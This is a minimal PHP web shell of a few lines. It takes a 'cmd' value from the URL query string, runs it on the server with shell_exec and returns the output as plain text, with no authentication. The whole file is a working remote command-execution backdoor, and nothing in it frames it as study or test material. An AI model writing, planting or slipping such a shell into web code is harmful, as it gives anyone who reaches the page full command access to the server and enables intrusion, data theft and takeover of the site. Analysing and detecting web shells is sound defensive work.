<?php
if (isset($_GET['cmd'])) {
    header('Content-Type: text/plain; charset=utf-8');
    echo shell_exec($_GET['cmd'] . ' 2>&1');
}
